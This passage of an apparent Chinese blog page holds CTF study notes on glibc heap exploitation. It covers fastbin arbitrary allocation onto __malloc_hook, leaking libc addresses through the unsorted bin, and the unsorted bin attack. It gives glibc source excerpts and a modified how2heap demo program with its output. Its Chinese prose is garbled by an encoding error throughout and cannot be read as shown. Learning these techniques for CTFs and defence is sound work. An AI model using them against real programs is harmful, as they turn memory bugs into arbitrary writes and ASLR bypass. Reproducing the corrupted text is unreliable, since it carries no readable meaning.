class="hljs-number">0</span>, size=<span class="hljs-number">0x10</span>]<br>Fastbins[idx=<span class="hljs-number">1</span>, size=<span class="hljs-number">0x20</span>]<br>Fastbins[idx=<span class="hljs-number">2</span>, size=<span class="hljs-number">0x30</span>]<br>Fastbins[idx=<span class="hljs-number">3</span>, size=<span class="hljs-number">0x40</span>]<br>Fastbins[idx=<span class="hljs-number">4</span>, size=<span class="hljs-number">0x50</span>]<br>Fastbins[idx=<span class="hljs-number">5</span>, size=<span class="hljs-number">0x60</span>]<br>Fastbins[idx=<span class="hljs-number">6</span>, size=<span class="hljs-number">0x70</span>]<br></code></pre></div></td></tr></table></figure><p>é€šè¿‡è§‚å¯Ÿå‘ç° 0x7ffff7dd1af5 å¤„å¯ä»¥ç°å®é”™ä½æ„é€ å‡ºä¸€ä¸ª 0x000000000000007f</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">0x7ffff7dd1af0 0x60 0x2 0xdd 0xf7 0xff 0x7f 0x0 0x0<br>0x7ffff7dd1af8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br><br>0x7ffff7dd1af5 &lt;_IO_wide_data_0+309&gt;:   0x000000000000007f<br></code></pre></div></td></tr></table></figure><p>å› ä¸º 0x7f åœ¨è®¡ç®— fastbin index æ—¶ï¼Œæ˜¯å±äº index 5 çš„ï¼Œå³ chunk å¤§å°ä¸º 0x70 çš„ã€‚</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> fastbin_index(sz)                                                      \</span><br><span class="hljs-meta">    ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span><br></code></pre></div></td></tr></table></figure><p>ï¼ˆæ³¨æ„ sz çš„å¤§å°æ˜¯ unsigned intï¼Œå› æ­¤åªå  4 ä¸ªå­—èŠ‚ï¼‰</p><p>è€Œå…¶å¤§å°åˆåŒ…å«äº† 0x10 çš„ chunk_headerï¼Œå› æ­¤æˆ‘ä»¬é€‰æ‹©åˆ†é… 0x60 çš„ fastbinï¼Œå°†å…¶åŠ å…¥é“¾è¡¨ã€‚ æœ€åç»è¿‡ä¸¤æ¬¡åˆ†é…å¯ä»¥è§‚å¯Ÿåˆ° chunk è¢«åˆ†é…åˆ° 0x7ffff7dd1afdï¼Œå› æ­¤æˆ‘ä»¬å°±å¯ä»¥ç›´æ¥æ§åˆ¶ __malloc_hook çš„å†…å®¹ (åœ¨æˆ‘çš„ libc ä¸­__realloc_hook ä¸__malloc_hook æ˜¯åœ¨è¿åœ¨ä¸€èµ·çš„)ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">0x4005a8 &lt;main+66&gt;        call   0x400450 &lt;malloc@plt&gt;<br> â†’   0x4005ad &lt;main+71&gt;        mov    QWORD PTR [rbp-0x8], rax<br><span class="hljs-meta"></span><br><span class="hljs-meta"> $</span><span class="bash">rax   : 0x7ffff7dd1afd</span><br><br>0x7ffff7dd1aed &lt;_IO_wide_data_0+301&gt;:   0xfff7dd0260000000  0x000000000000007f<br>0x7ffff7dd1afd: 0xfff7a92e20000000  0xfff7a92a0000007f<br>0x7ffff7dd1b0d &lt;__realloc_hook+5&gt;:  0x000000000000007f  0x0000000000000000<br>0x7ffff7dd1b1d: 0x0000000000000000  0x0000000000000000<br></code></pre></div></td></tr></table></figure><h3 id="å°æ€»ç»“-2"><a href="#å°æ€»ç»“-2" class="headerlink" title="å°æ€»ç»“"></a>å°æ€»ç»“</h3><p>Arbitrary Alloc åœ¨ CTF ä¸­ç”¨åœ°æ›´åŠ é¢‘ç¹ã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å­—èŠ‚é”™ä½ç­‰æ–¹æ³•æ¥ç»•è¿‡ size åŸŸçš„æ£€éªŒï¼Œå®ç°ä»»æ„åœ°å€åˆ†é… chunkï¼Œæœ€åçš„æ•ˆæœä¹Ÿå°±ç›¸å½“äºä»»æ„åœ°å€å†™ä»»æ„å€¼ã€‚</p><h2 id="å…·ä½“é¢˜ç›®é‡åˆ°å†è¯´"><a href="#å…·ä½“é¢˜ç›®é‡åˆ°å†è¯´" class="headerlink" title="å…·ä½“é¢˜ç›®é‡åˆ°å†è¯´"></a>å…·ä½“é¢˜ç›®é‡åˆ°å†è¯´</h2><h1 id="unsortedbin-attack"><a href="#unsortedbin-attack" class="headerlink" title="unsortedbin attack"></a>unsortedbin attack</h1><h2 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h2><p>Unsorted Bin Attackï¼Œé¡¾åæ€ä¹‰ï¼Œè¯¥æ”»å‡»ä¸ Glibc å †ç®¡ç†ä¸­çš„çš„ Unsorted Bin çš„æœºåˆ¶ç´§å¯†ç›¸å…³ã€‚</p><p>Unsorted Bin Attack è¢«åˆ©ç”¨çš„å‰ææ˜¯æ§åˆ¶ Unsorted Bin Chunk çš„ bk æŒ‡é’ˆã€‚</p><p>Unsorted Bin Attack å¯ä»¥è¾¾åˆ°çš„æ•ˆæœæ˜¯å®ç°ä¿®æ”¹ä»»æ„åœ°å€å€¼ä¸ºä¸€ä¸ªè¾ƒå¤§çš„æ•°å€¼ã€‚</p><p><strong>åŸºæœ¬æ¥æº</strong> </p><ol><li>å½“ä¸€ä¸ªè¾ƒå¤§çš„ chunk è¢«åˆ†å‰²æˆä¸¤åŠåï¼Œå¦‚æœå‰©ä¸‹çš„éƒ¨åˆ†å¤§äº MINSIZEï¼Œå°±ä¼šè¢«æ”¾åˆ° unsorted bin ä¸­ã€‚</li><li>é‡Šæ”¾ä¸€ä¸ªä¸å±äº fast bin çš„ chunkï¼Œå¹¶ä¸”è¯¥ chunk ä¸å’Œ top chunk ç´§é‚»æ—¶ï¼Œè¯¥ chunk ä¼šè¢«é¦–å…ˆæ”¾åˆ° unsorted bin ä¸­ã€‚å…³äº top chunk çš„è§£é‡Šï¼Œè¯·å‚è€ƒä¸‹é¢çš„ä»‹ç»ã€‚</li><li>å½“è¿›è¡Œ malloc_consolidate æ—¶ï¼Œå¯èƒ½ä¼šæŠŠåˆå¹¶åçš„ chunk æ”¾åˆ° unsorted bin ä¸­ï¼Œå¦‚æœä¸æ˜¯å’Œ top chunk è¿‘é‚»çš„è¯ã€‚</li></ol><h2 id="Unsorted-Bin-Leak"><a href="#Unsorted-Bin-Leak" class="headerlink" title="Unsorted Bin Leak"></a>Unsorted Bin Leak</h2><h3 id="Leak-åŸç†"><a href="#Leak-åŸç†" class="headerlink" title="Leak åŸç†"></a>Leak åŸç†</h3><p>å¦‚æœæˆ‘ä»¬å¯ä»¥æŠŠæ­£ç¡®çš„ <code>fd</code> æŒ‡é’ˆ leak å‡ºæ¥ï¼Œå°±å¯ä»¥è·å¾—ä¸€ä¸ªä¸ <code>main_arena</code> æœ‰å›ºå®šåç§»çš„åœ°å€ï¼Œè¿™ä¸ªåç§»å¯ä»¥é€šè¿‡è°ƒè¯•å¾—å‡ºã€‚è€Œ<code>main_arena</code> æ˜¯ä¸€ä¸ª <code>struct malloc_state</code> ç±»å‹çš„å…¨å±€å˜é‡ï¼Œæ˜¯ <code>ptmalloc</code> ç®¡ç†ä¸»åˆ†é…åŒºçš„å”¯ä¸€å®ä¾‹ã€‚è¯´åˆ°å…¨å±€å˜é‡ï¼Œç«‹é©¬å¯ä»¥æƒ³åˆ°ä»–ä¼šè¢«åˆ†é…åœ¨ <code>.data</code> æˆ–è€… <code>.bss</code> ç­‰æ®µä¸Šï¼Œé‚£ä¹ˆå¦‚æœæˆ‘ä»¬æœ‰è¿›ç¨‹æ‰€ä½¿ç”¨çš„ <code>libc</code> çš„ <code>.so</code> æ–‡ä»¶çš„è¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥è·å¾— <code>main_arena</code> ä¸ <code>libc</code> åŸºåœ°å€çš„åç§»ï¼Œå®ç°å¯¹ <code>ASLR</code> çš„ç»•è¿‡ã€‚</p><p>é‚£ä¹ˆå¦‚ä½•å–å¾— <code>main_arena</code> ä¸ <code>libc</code> åŸºå€çš„åç§»å‘¢ï¼Ÿè¿™é‡Œæä¾›ä¸¤ç§æ€è·¯ã€‚</p><ol><li><strong>__malloc_trim å‡½æ•°å¾—å‡º</strong> </li></ol><p>åœ¨ <code>malloc.c</code> ä¸­æœ‰è¿™æ ·ä¸€æ®µä»£ç </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">int</span><br>__malloc_trim (<span class="hljs-keyword">size_t</span> s)<br>&#123;<br>  <span class="hljs-keyword">int</span> result = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-keyword">if</span> (__malloc_initialized &lt; <span class="hljs-number">0</span>)<br>    ptmalloc_init ();<br><br>  mstate ar_ptr = &amp;main_arena;<span class="hljs-comment">//&lt;=here!</span><br>  <span class="hljs-keyword">do</span><br>    &#123;<br>      __libc_lock_lock (ar_ptr-&gt;mutex);<br>      result |= mtrim (ar_ptr, s);<br>      __libc_lock_unlock (ar_ptr-&gt;mutex);<br><br>      ar_ptr = ar_ptr-&gt;next;<br>    &#125;<br>  <span class="hljs-keyword">while</span> (ar_ptr != &amp;main_arena);<br><br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>æ³¨æ„åˆ° <code>mstate ar_ptr = &amp;main_arena;</code> è¿™é‡Œå¯¹ <code>main_arena</code> è¿›è¡Œäº†è®¿é—®ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ IDA ç­‰å·¥å…·åˆ†æå‡ºåç§»äº†ã€‚</p><p>æ¯”å¦‚æŠŠ <code>.so</code> æ–‡ä»¶æ”¾åˆ° IDA ä¸­ï¼Œæ‰¾åˆ° <code>malloc_trim</code> å‡½æ•°ï¼Œå°±å¯ä»¥è·å¾—åç§»äº†ã€‚</p><ol start="2"><li><strong>__malloc_hook ç›´æ¥ç®—å‡º</strong> </li></ol><p>æ¯”è¾ƒå·§åˆçš„æ˜¯ï¼Œ<code>main_arena</code> å’Œ <code>__malloc_hook</code> çš„åœ°å€å·®æ˜¯ 0x10ï¼Œè€Œå¤§å¤šæ•°çš„ libc éƒ½å¯ä»¥ç›´æ¥æŸ¥å‡º <code>__malloc_hook</code> çš„åœ°å€ï¼Œè¿™æ ·å¯ä»¥å¤§å¹…å‡å°å·¥ä½œé‡ã€‚ä»¥ pwntools ä¸ºä¾‹</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">main_arena_offset = ELF(<span class="hljs-string">&quot;libc.so.6&quot;</span>).symbols[<span class="hljs-string">&quot;__malloc_hook&quot;</span>] + <span class="hljs-number">0x10</span><br></code></pre></div></td></tr></table></figure><p>è¿™æ ·å°±å¯ä»¥è·å¾— <code>main_arena</code> ä¸åŸºåœ°å€çš„åç§»äº†ã€‚</p><h3 id="å®ç°-Leak-çš„æ–¹æ³•"><a href="#å®ç°-Leak-çš„æ–¹æ³•" class="headerlink" title="å®ç° Leak çš„æ–¹æ³•"></a>å®ç° Leak çš„æ–¹æ³•</h3><p>ä¸€èˆ¬æ¥è¯´ï¼Œè¦å®ç° leakï¼Œéœ€è¦æœ‰ <code>UAF</code>ï¼Œå°†ä¸€ä¸ª <code>chunk</code> æ”¾å…¥ <code>Unsorted Bin</code> ä¸­åå†æ‰“å‡ºå…¶ <code>fd</code>ã€‚ä¸€èˆ¬çš„ç¬”è®°ç®¡ç†é¢˜éƒ½ä¼šæœ‰ <code>show</code> çš„åŠŸèƒ½ï¼Œå¯¹å¤„äºé“¾è¡¨å°¾çš„èŠ‚ç‚¹ <code>show</code> å°±å¯ä»¥è·å¾— <code>libc</code> çš„åŸºåœ°å€äº†ã€‚</p><p>ç‰¹åˆ«çš„ï¼Œ<code>CTF</code> ä¸­çš„åˆ©ç”¨ï¼Œå †å¾€å¾€æ˜¯åˆšåˆšåˆå§‹åŒ–çš„ï¼Œæ‰€ä»¥ <code>Unsorted Bin</code> ä¸€èˆ¬éƒ½æ˜¯å¹²å‡€çš„ï¼Œå½“é‡Œé¢åªå­˜åœ¨ä¸€ä¸ª <code>bin</code> çš„æ—¶å€™ï¼Œè¯¥ <code>bin</code> çš„ <code>fd</code> å’Œ <code>bk</code> éƒ½ä¼šæŒ‡å‘ <code>main_arena</code> ä¸­ã€‚</p><p>å¦å¤–ï¼Œå¦‚æœæˆ‘ä»¬æ— æ³•åšåˆ°è®¿é—®é“¾è¡¨å°¾ï¼Œä½†æ˜¯å¯ä»¥è®¿é—®é“¾è¡¨å¤´ï¼Œé‚£ä¹ˆåœ¨ 32 ä½çš„ç¯å¢ƒä¸‹ï¼Œå¯¹é“¾è¡¨å¤´è¿›è¡Œ <code>printf</code> ç­‰å¾€å¾€å¯ä»¥æŠŠ <code>fd</code> å’Œ <code>bk</code> ä¸€èµ·è¾“å‡ºå‡ºæ¥ï¼Œè¿™ä¸ªæ—¶å€™åŒæ ·å¯ä»¥å®ç°æœ‰æ•ˆçš„ leakã€‚</p><p>ç„¶è€Œåœ¨ 64 ä½ä¸‹ï¼Œç”±äºé«˜åœ°å€å¾€å¾€ä¸º <code>\x00</code>ï¼Œå¾ˆå¤šè¾“å‡ºå‡½æ•°ä¼šè¢«æˆªæ–­ï¼Œè¿™ä¸ªæ—¶å€™å¯èƒ½å°±éš¾ä»¥å®ç°æœ‰æ•ˆ leakã€‚</p><h2 id="Unsorted-Bin-Attack-åŸç†"><a href="#Unsorted-Bin-Attack-åŸç†" class="headerlink" title="Unsorted Bin Attack åŸç†"></a>Unsorted Bin Attack åŸç†</h2><p>åœ¨ <a href="https://code.woboq.org/userspace/glibc/">glibc</a>/<a href="https://code.woboq.org/userspace/glibc/malloc/">malloc</a>/<a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html">malloc.c</a> ä¸­çš„ <code>_int_malloc</code> æœ‰è¿™ä¹ˆä¸€æ®µä»£ç ï¼Œå½“å°†ä¸€ä¸ª unsorted  bin å–å‡ºçš„æ—¶å€™ï¼Œä¼šå°† <code>bck-&gt;fd</code> çš„ä½ç½®å†™å…¥æœ¬ Unsorted Bin çš„ä½ç½®ã€‚</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* remove from unsorted list */</span><br><span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<br>  malloc_printerr (<span class="hljs-string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);<br>unsorted_chunks (av)-&gt;bk = bck;<br>bck-&gt;fd = unsorted_chunks (av);<br></code></pre></div></td></tr></table></figure><p>æ¢è€Œè¨€ä¹‹ï¼Œå¦‚æœæˆ‘ä»¬æ§åˆ¶äº† <code>bk</code> çš„å€¼ï¼Œæˆ‘ä»¬å°±èƒ½å°† <code>unsorted_chunks (av)</code> å†™åˆ°ä»»æ„åœ°å€ã€‚</p><blockquote><p>æ³¨æ„!!!è¿™ç§æ£€æŸ¥ä»2.28ç‰ˆæœ¬å¼€å§‹, æœ¬ç¯‡éƒ¨åˆ†2.27å·²ä¿®æ”¹ä¸º2.28ç‰ˆæœ¬, æ›´æ–°çš„æœ‰å¾…æ›´æ–°</p></blockquote><p>è¿™é‡Œæˆ‘ä»¥ shellphish çš„ how2heap ä»“åº“ä¸­çš„ <a href="https://github.com/shellphish/how2heap/blob/master/unsorted_bin_attack.c">unsorted_bin_attack.c</a> ä¸ºä¾‹è¿›è¡Œä»‹ç»ï¼Œè¿™é‡Œæˆ‘åšä¸€äº›ç®€å•çš„ä¿®æ”¹ï¼Œå¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;This file demonstrates unsorted bin attack by write a large &quot;</span><br>                  <span class="hljs-string">&quot;unsigned long value into stack\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(<br>      <span class="hljs-built_in">stderr</span>,<br>      <span class="hljs-string">&quot;In practice, unsorted bin attack is generally prepared for further &quot;</span><br>      <span class="hljs-string">&quot;attacks, such as rewriting the &quot;</span><br>      <span class="hljs-string">&quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;</span>);<br><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> target_var = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<br>          <span class="hljs-string">&quot;Let&#x27;s first look at the target we want to rewrite on stack:\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%p: %ld\n\n&quot;</span>, &amp;target_var, target_var);<br><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *p = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">400</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now, we allocate first normal chunk on the heap at: %p\n&quot;</span>,<br>          p);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;And allocate another normal chunk in order to avoid &quot;</span><br>                  <span class="hljs-string">&quot;consolidating the top chunk with&quot;</span><br>                  <span class="hljs-string">&quot;the first one during the free()\n\n&quot;</span>);<br>  <span class="hljs-built_in">malloc</span>(<span class="hljs-number">500</span>);<br><br>  <span class="hljs-built_in">free</span>(p);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;We free the first chunk now and it will be inserted in the &quot;</span><br>                  <span class="hljs-string">&quot;unsorted bin with its bk pointer &quot;</span><br>                  <span class="hljs-string">&quot;point to %p\n&quot;</span>,<br>          (<span class="hljs-keyword">void</span> *)p[<span class="hljs-number">1</span>]);<br><br>  <span class="hljs-comment">/*------------VULNERABILITY-----------*/</span><br>  p[<span class="hljs-number">1</span>] = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(&amp;target_var - <span class="hljs-number">2</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now emulating a vulnerability that can overwrite the &quot;</span><br>                  <span class="hljs-string">&quot;victim-&gt;bk pointer\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;And we write it with the target address-16 (in 32-bits &quot;</span><br>                  <span class="hljs-string">&quot;machine, it should be target address-8):%p\n\n&quot;</span>,<br>          (<span class="hljs-keyword">void</span> *)p[<span class="hljs-number">1</span>]);<br><br>  <span class="hljs-comment">//------------------------------------</span><br><br>  <span class="hljs-built_in">malloc</span>(<span class="hljs-number">400</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Let&#x27;s malloc again to get the chunk we just free. During &quot;</span><br>                  <span class="hljs-string">&quot;this time, target should has already been &quot;</span><br>                  <span class="hljs-string">&quot;rewrite:\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%p: %p\n&quot;</span>, &amp;target_var, (<span class="hljs-keyword">void</span> *)target_var);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>ç¨‹åºæ‰§è¡Œåçš„æ•ˆæœä¸º</p><figure class="highlight markdown"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs markdown">âœ  unsorted<span class="hljs-emphasis">_bin_</span>attack git:(master) âœ— gcc unsorted<span class="hljs-emphasis">_bin_</span>attack.c -o unsorted<span class="hljs-emphasis">_bin_</span>attack<br>âœ  unsorted<span class="hljs-emphasis">_bin_</span>attack git:(master) âœ— ./unsorted<span class="hljs-emphasis">_bin_</span>attack<br>This file demonstrates unsorted bin attack by write a large unsigned long value into stack<br>In practice, unsorted bin attack is generally prepared for further attacks, such as <span class="hljs-emphasis">*rewriting the global variable global_max_fast*</span> in libc for further fastbin attack<br><br>Let&#x27;s first look at the target we want to rewrite on stack:<br>0x7ffe0d232518: 0<br><br>Now, we allocate first normal chunk on the heap at: 0x1fce010<br>And allocate another normal chunk in order to avoid consolidating the top chunk withthe first one during the free()<br><br>We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7f1c705ffb78<br>Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer<br>And we write it with the target address-16 (in 32-bits machine, it should be target address-8):0x7ffe0d232508<br><br>Let&#x27;s malloc again to get the chunk we just free. During this time, target should has already been rewrite:<br>0x7ffe0d232518: 0x7f1c705ffb78<br></code></pre></div></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸€ä¸ªå›¾æ¥æè¿°ä¸€ä¸‹å…·ä½“å‘ç”Ÿçš„æµç¨‹ä»¥åŠèƒŒåçš„åŸç†ã€‚</p><p><img src="../../image/glibc_malloc_srcCode/unsorted_bin_attack_order.png" alt="img"></p><p><strong>åˆå§‹çŠ¶æ€æ—¶</strong> </p><p>unsorted bin çš„ fd å’Œ bk å‡æŒ‡å‘ unsorted bin æœ¬èº«ã€‚</p><p><strong>æ‰§è¡Œ free(p)</strong> </p><p>ç”±äºé‡Šæ”¾çš„ chunk å¤§å°ä¸å±äº fast bin èŒƒå›´å†…ï¼Œæ‰€ä»¥ä¼šé¦–å…ˆæ”¾å…¥åˆ° unsorted bin ä¸­ã€‚</p><p><strong>ä¿®æ”¹ p[1]</strong> </p><p>ç»è¿‡ä¿®æ”¹ä¹‹åï¼ŒåŸæ¥åœ¨ unsorted bin ä¸­çš„ p çš„ bk æŒ‡é’ˆå°±ä¼šæŒ‡å‘ target addr-16 å¤„ä¼ªé€ çš„ chunkï¼Œå³ Target Value å¤„äºä¼ªé€  chunk çš„ fd å¤„ã€‚</p><p><strong>ç”³è¯· 400 å¤§å°çš„ chunk</strong> </p><p>æ­¤æ—¶ï¼Œæ‰€ç”³è¯·çš„ chunk å¤„äº small bin æ‰€åœ¨çš„èŒƒå›´ï¼Œå…¶å¯¹åº”çš„ bin ä¸­æš‚æ—¶æ²¡æœ‰ chunkï¼Œæ‰€ä»¥ä¼šå» unsorted bin ä¸­æ‰¾ï¼Œå‘ç° unsorted bin ä¸ç©ºï¼Œäºæ˜¯æŠŠ unsorted bin ä¸­çš„æœ€åä¸€ä¸ª chunk æ‹¿å‡ºæ¥ã€‚</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">while</span> ((victim = unsorted_chunks(av)-&gt;bk) != unsorted_chunks(av)) &#123;<br>    bck = victim-&gt;bk;<br>    <span class="hljs-keyword">if</span> (__builtin_expect(chunksize_nomask(victim) &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>) ||<br>        __builtin_expect(chunksize_nomask(victim) &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))<br>        malloc_printerr(check_action, <span class="hljs-string">&quot;malloc(): memory corruption&quot;</span>,<br>                        chunk2mem(victim), av);<br>    size = chunksize(victim);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">       If a small request, try to use last remainder if it is the</span><br><span class="hljs-comment">       only chunk in unsorted bin.  This helps promote locality for</span><br><span class="hljs-comment">       runs of consecutive small requests. This is the only</span><br><span class="hljs-comment">       exception to best-fit, and applies only when there is</span><br><span class="hljs-comment">       no exact fit for a small chunk.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-comment">/* æ˜¾ç„¶ï¼Œbckè¢«ä¿®æ”¹ï¼Œå¹¶ä¸ç¬¦åˆè¿™é‡Œçš„è¦æ±‚*/</span><br>    <span class="hljs-keyword">if</span> (in_smallbin_range(nb) &amp;&amp; bck == unsorted_chunks(av) &amp;&amp;<br>        victim == av-&gt;last_remainder &amp;&amp;<br>        (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (size) &gt; (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (nb + MINSIZE)) &#123;<br>        ....<br>    &#125;<br><br>    <span class="hljs-comment">/* remove from unsorted list */</span><br>    unsorted_chunks(av)-&gt;bk = bck;<br>    bck-&gt;fd                 = unsorted_chunks(av);<br></code></pre></div></td></tr></table></figure><ul><li>victim = unsorted_chunks(av)-&gt;bk=p</li><li>bck = victim-&gt;bk=p-&gt;bk = target addr-16</li><li>unsorted_chunks(av)-&gt;bk = bck=target addr-16</li><li>bck-&gt;fd = *(target addr -16+16) = unsorted_chunks(av);</li></ul><p><strong>å¯ä»¥çœ‹å‡ºï¼Œåœ¨å°† unsorted bin çš„æœ€åä¸€ä¸ª chunk æ‹¿å‡ºæ¥çš„è¿‡ç¨‹ä¸­ï¼Œvictim çš„ fd å¹¶æ²¡æœ‰å‘æŒ¥ä½œç”¨ï¼Œæ‰€ä»¥å³ä½¿æˆ‘ä»¬ä¿®æ”¹äº†å…¶ä¸ºä¸€ä¸ªä¸åˆæ³•çš„å€¼ä¹Ÿæ²¡æœ‰å…³ç³»ã€‚</strong>ç„¶è€Œï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œunsorted bin é“¾è¡¨å¯èƒ½<strong>å°±æ­¤ç ´å</strong>ï¼Œåœ¨æ’å…¥ chunk æ—¶ï¼Œå¯èƒ½ä¼šå‡ºç°é—®é¢˜ã€‚</p><p><strong>å³ä¿®æ”¹ target å¤„çš„å€¼ä¸º unsorted bin çš„é“¾è¡¨å¤´éƒ¨ 